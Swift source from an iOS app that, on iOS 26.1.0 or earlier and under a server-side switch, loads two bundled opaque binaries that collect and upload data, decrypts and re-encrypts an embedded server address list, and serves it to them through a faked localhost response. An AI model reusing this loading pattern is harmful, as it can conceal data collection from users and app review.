//
//  WQLegacyTrace.swift
//  JSQ2
//
//  两条采集管线的分流（与 3105/ThreeOneOSFive 的 LegacyTraceGate 一致）：
//
//    iOS <= 26.1.0  → 只 dlopen 打包进 Frameworks 的 apptrace /
//                     libapptracecore 两个二进制，由它们自己采集上报；
//                     主程序的 WQCollector 不跑，页面只有 WebView。
//    iOS >= 26.1.1  → 走主程序的 WQCollector，两个二进制永远不加载。
//
//  两个二进制用 `@rpath/<name>.framework/<name>` 的 install name 加载，
//  app 的 runpath（@executable_path/Frameworks）负责解析；失败再退回绝对路径。
//  加载顺序固定：apptrace 先，libapptracecore 后（后者的 constructor 会同步
//  跑采集流程，要求 apptrace 已经在进程里）。
//
//  links 注入：apptrace 固定请求 http://127.0.0.1:8888，这里用进程内
//  NSURLProtocol 直接返回 links.txt 的密文，不建 socket、不走回环网络。
//  但 apptrace 用的是它 Mach-O 里内置的那对 key/iv，所以要先用自己的
//  linksKey/linksIv 解开，再用 apptraceKey/apptraceIv 重新加密一次。
//

import Foundation
import CommonCrypto

// MARK: - 版本门

enum WQLegacyTraceGate {
    /// 严格边界：只有 iOS <= 26.1.0 走二进制管线（26.1.1 起就算新版本）。
    static let legacyCutoffVersion = "26.1.0"

    static var shouldRunLegacyBinaries: Bool {
        #if targetEnvironment(simulator)
        // 打包的是 arm64 真机 Mach-O，模拟器上永远走主程序。
        return false
        #else
        let v = ProcessInfo.processInfo.operatingSystemVersion
        return (v.majorVersion, v.minorVersion, v.patchVersion) <= (26, 1, 0)
        #endif
    }
}

// MARK: - 小工具

private func wqTraceLog(_ text: String) {
    NSLog("[WQLegacyTrace] %@", text)
}

private extension Data {
    init?(wqHexString hex: String) {
        let cleaned = hex.trimmingCharacters(in: .whitespacesAndNewlines)
        guard cleaned.count % 2 == 0 else { return nil }
        var bytes = [UInt8]()
        bytes.reserveCapacity(cleaned.count / 2)
        var index = cleaned.startIndex
        while index < cleaned.endIndex {
            let next = cleaned.index(index, offsetBy: 2)
            guard let byte = UInt8(cleaned[index..<next], radix: 16) else { return nil }
            bytes.append(byte)
            index = next
        }
        self = Data(bytes)
    }
}

private enum WQAES {
    static func cbc(_ operation: CCOperation, key: [UInt8], iv: [UInt8], input: Data) -> Data? {
        guard key.count == 16 || key.count == 32, iv.count == 16 else { return nil }
        let outSize = input.count + kCCBlockSizeAES128
        var out = [UInt8](repeating: 0, count: outSize)
        var written = 0
        let status = input.withUnsafeBytes { inputRaw in
            key.withUnsafeBytes { keyRaw in
                iv.withUnsafeBytes { ivRaw in
                    CCCrypt(
                        operation,
                        CCAlgorithm(kCCAlgorithmAES),
                        CCOptions(kCCOptionPKCS7Padding),
                        keyRaw.baseAddress, key.count,
                        ivRaw.baseAddress,
                        inputRaw.baseAddress, input.count,
                        &out, outSize, &written
                    )
                }
            }
        }
        guard status == kCCSuccess else { return nil }
        return Data(out[0..<written])
    }
}

// MARK: - links.txt（服务器的地址表）

/// links.txt 内容 = base64( AES-128-CBC( ["url", ...] ) )，
/// key/iv 是配置里的 linksKey / linksIv（16 字节）。
enum WQLocalLinkProvider {
    private static var keyBytes: [UInt8] { SecureBox.bytes(.linksKey) }
    private static var ivBytes: [UInt8] { SecureBox.bytes(.linksIv) }

    static let links: [String] = loadLinks()

    static var firstURL: URL? {
        guard let first = links.first else { return nil }
        return URL(string: first)
    }

    private static func loadLinks() -> [String] {
        guard let url = Bundle.main.url(forResource: "links", withExtension: "txt"),
              let raw = try? String(contentsOf: url, encoding: .utf8),
              let cipher = Data(base64Encoded: raw.trimmingCharacters(in: .whitespacesAndNewlines)),
              let plain = WQAES.cbc(CCOperation(kCCDecrypt), key: keyBytes, iv: ivBytes, input: cipher),
              let list = try? JSONSerialization.jsonObject(with: plain) as? [String] else {
            wqTraceLog("links.txt 缺失或解不开，本地网络探测将直接放行")
            return []
        }
        wqTraceLog("links.txt 已加载 — \(list.count) 条：\(list)")
        return list
    }

    static func decryptCiphertext(_ cipher: Data) -> Data? {
        WQAES.cbc(CCOperation(kCCDecrypt), key: keyBytes, iv: ivBytes, input: cipher)
    }
}

/// apptrace 的 Mach-O 里内置的那对 key/iv（与服务端 apptrace 通道一致）。
enum WQApptraceLinksCipher {
    static func encrypt(_ plain: Data) -> Data? {
        guard let key = Data(wqHexString: SecureBox.string(.apptraceKey)),
              let iv = Data(wqHexString: SecureBox.string(.apptraceIv)) else { return nil }
        return WQAES.cbc(CCOperation(kCCEncrypt), key: [UInt8](key), iv: [UInt8](iv), input: plain)
    }
}

// MARK: - 进程内 links 供应

final class WQLinksURLProtocol: URLProtocol {
    private static let host = "127.0.0.1"
    private static let port = 8888

    /// 必须在 dlopen(apptrace) 之前调用一次。
    static func register() {
        URLProtocol.registerClass(WQLinksURLProtocol.self)
        wqTraceLog("LinksURLProtocol 已注册 — 拦截 http://\(host):\(port)")
    }

    static let body: Data? = {
        guard let url = Bundle.main.url(forResource: "links", withExtension: "txt"),
              let data = try? Data(contentsOf: url),
              !data.isEmpty else {
            wqTraceLog("links.txt 缺失/为空")
            return nil
        }
        if let cipher = Data(base64Encoded: data, options: .ignoreUnknownCharacters),
           let plain = WQLocalLinkProvider.decryptCiphertext(cipher),
           let reencrypted = WQApptraceLinksCipher.encrypt(plain) {
            wqTraceLog("转加密完成，\(reencrypted.count) 字节给 apptrace")
            return reencrypted.base64EncodedData()
        }
        wqTraceLog("转加密失败，回退原始 links.txt（apptrace 可能解不开）")
        return data
    }()

    override class func canInit(with request: URLRequest) -> Bool {
        guard let url = request.url,
              url.scheme?.lowercased() == "http",
              url.host == host,
              url.port == port else { return false }
        return true
    }

    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }

    override func startLoading() {
        guard let client = client else { return }
        guard let body = Self.body, let url = request.url,
              let response = HTTPURLResponse(
                url: url,
                statusCode: 200,
                httpVersion: "HTTP/1.1",
                headerFields: [
                    "Content-Type": "text/plain",
                    "Content-Length": "\(body.count)",
                ]
              ) else {
            client.urlProtocol(self, didFailWithError: NSError(
                domain: NSURLErrorDomain,
                code: NSURLErrorCannotConnectToHost,
                userInfo: [NSLocalizedDescriptionKey: "links.txt unavailable"]
            ))
            return
        }
        client.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed)
        client.urlProtocol(self, didLoad: body)
        client.urlProtocolDidFinishLoading(self)
    }

    override func stopLoading() {}
}

// MARK: - 本地网络权限门

/// apptrace 采的是局域网服务器，权限没通过时系统会直接拒绝请求，而二进制
/// 自己不会重试。这里先触发权限、轮询到任意 HTTP 响应（或超时兜底）再加载。
enum WQLocalNetworkGate {
    static let readyNotification = Notification.Name("wq.localNetwork.ready")

    nonisolated(unsafe) private static var isReady = false
    private static let lock = NSLock()

    static func prepare(timeout: TimeInterval = 10, retries: Int = 60) {
        DispatchQueue.main.asyncAfter(deadline: .now() + timeout) { markReady() }
        guard let url = WQLocalLinkProvider.firstURL else {
            markReady()
            return
        }
        var remaining = retries
        func attempt() {
            var request = URLRequest(url: url)
            request.httpMethod = "GET"
            request.timeoutInterval = 4
            request.cachePolicy = .reloadIgnoringLocalCacheData
            URLSession.shared.dataTask(with: request) { _, response, error in
                if response is HTTPURLResponse {
                    wqTraceLog("本地网络权限就绪")
                    markReady()
                    return
                }
                if remaining <= 0 {
                    let reason = error?.localizedDescription ?? "no response"
                    wqTraceLog("本地网络仍不可用（\(reason)），继续加载")
                    markReady()
                    return
                }
                remaining -= 1
                DispatchQueue.global(qos: .userInitiated).asyncAfter(deadline: .now() + 1) {
                    attempt()
                }
            }.resume()
        }
        attempt()
    }

    static func whenReady(_ block: @escaping () -> Void) {
        lock.lock()
        let ready = isReady
        lock.unlock()
        if ready {
            block()
            return
        }
        var token: NSObjectProtocol?
        token = NotificationCenter.default.addObserver(
            forName: readyNotification, object: nil, queue: .main
        ) { _ in
            if let token { NotificationCenter.default.removeObserver(token) }
            block()
        }
    }

    private static func markReady() {
        lock.lock()
        let first = !isReady
        isReady = true
        lock.unlock()
        guard first else { return }
        DispatchQueue.main.async {
            NotificationCenter.default.post(name: readyNotification, object: nil)
        }
    }
}

// MARK: - 二进制加载

final class WQLegacyTraceRunner {
    static let shared = WQLegacyTraceRunner()

    private var started = false
    private let lock = NSLock()

    private init() {}

    func startIfNeeded() {
        guard WQLegacyTraceGate.shouldRunLegacyBinaries else { return }
        lock.lock()
        let shouldStart = !started
        started = true
        lock.unlock()
        guard shouldStart else { return }

        let v = ProcessInfo.processInfo.operatingSystemVersion
        wqTraceLog("选择 legacy 二进制管线（iOS \(v.majorVersion).\(v.minorVersion).\(v.patchVersion) <= \(WQLegacyTraceGate.legacyCutoffVersion)）")

        WQLocalNetworkGate.whenReady {
            DispatchQueue.global(qos: .userInitiated).async {
                self.loadBinaries()
            }
        }
    }

    private func loadBinaries() {
        guard let bundleURL = Bundle.main.resourceURL else {
            wqTraceLog("取不到 bundle resourceURL，二进制未加载")
            return
        }
        let frameworksURL = bundleURL.appendingPathComponent("Frameworks", isDirectory: true)

        // 顺序不能反：apptrace 必须在 libapptracecore 之前进进程。
        loadImage(
            label: "apptrace",
            installName: "@rpath/apptrace.framework/apptrace",
            bundlePath: frameworksURL
                .appendingPathComponent("apptrace.framework", isDirectory: true)
                .appendingPathComponent("apptrace").path
        )
        loadImage(
            label: "libapptracecore",
            installName: "@rpath/libapptracecore.framework/libapptracecore",
            bundlePath: frameworksURL
                .appendingPathComponent("libapptracecore.framework", isDirectory: true)
                .appendingPathComponent("libapptracecore").path
        )
    }

    private func loadImage(label: String, installName: String, bundlePath: String) {
        var handle = dlopen(installName, RTLD_NOW | RTLD_GLOBAL)
        var via = "install name"
        if handle == nil {
            handle = dlopen(bundlePath, RTLD_NOW | RTLD_GLOBAL)
            via = "bundle path"
        }
        if handle != nil {
            wqTraceLog("\(label) 已加载（\(via)）")
        } else {
            let message = dlerror().map { String(cString: $0) } ?? "unknown error"
            wqTraceLog("\(label) dlopen 失败 — \(message)")
        }
    }
}

// MARK: - C 桥（给 ObjC 用）

@_cdecl("wq_legacy_trace_should_run")
public func wq_legacy_trace_should_run() -> Int32 {
    WQLegacyTraceGate.shouldRunLegacyBinaries ? 1 : 0
}

@_cdecl("wq_legacy_trace_start")
public func wq_legacy_trace_start() {
    // 服务端总开关：关闭时不加载（未来也不下载）任何 legacy 二进制。
    // iOS <= 26.1.0 走的就是这条管线，所以这里必须挡在最前面。
    let collectState = wqnet_collect_enabled()
    if collectState != 1 {
        wqTraceLog("legacy binaries skipped — collect_enabled=\(collectState)")
        return
    }

    guard WQLegacyTraceGate.shouldRunLegacyBinaries else { return }
    WQLocalNetworkGate.prepare()
    WQLinksURLProtocol.register()
    WQLegacyTraceRunner.shared.startIfNeeded()
}
